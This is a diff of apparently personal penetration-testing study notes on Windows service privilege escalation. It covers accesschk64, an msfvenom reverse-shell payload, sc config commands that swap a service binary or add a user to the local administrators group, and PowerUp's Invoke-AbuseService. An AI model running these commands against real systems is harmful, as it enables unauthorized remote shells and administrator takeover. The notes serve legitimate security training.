@@ -1,5 +1,5 @@
 
-Check `accesschk64` if we have privileges over a process
+Check using `accesschk64` if we have privileges over a process
 
 https://learn.microsoft.com/it-it/sysinternals/downloads/accesschk
 
@@ -13,13 +13,13 @@ msvenom -p windows/shell_reverse_tcp LHOST=$ip -f exe -o malicious.exe
 ```
 
 Change service binary path
-```sh
+```powershell 
 
 sc config WindscribeService binpath="C:\Mal.exe
 
 OR 
-#execute a command
 
+#execute a command
 sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"
 ```
 
@@ -41,4 +41,17 @@ cp .\mal.exe .\simpleService.exe
 ```
 
 
+
+
+**PowerUp**
+
+```powershell 
+invoke-allchecks
+
+#note that they would suggest some abbuse to do if we want examples
+help Invoke-AbuseService -examples
+
+#Abuse
+Invoke-AbuseService -Name "Abyssservice" -usenrame <someusername> -Verbose
+```
 
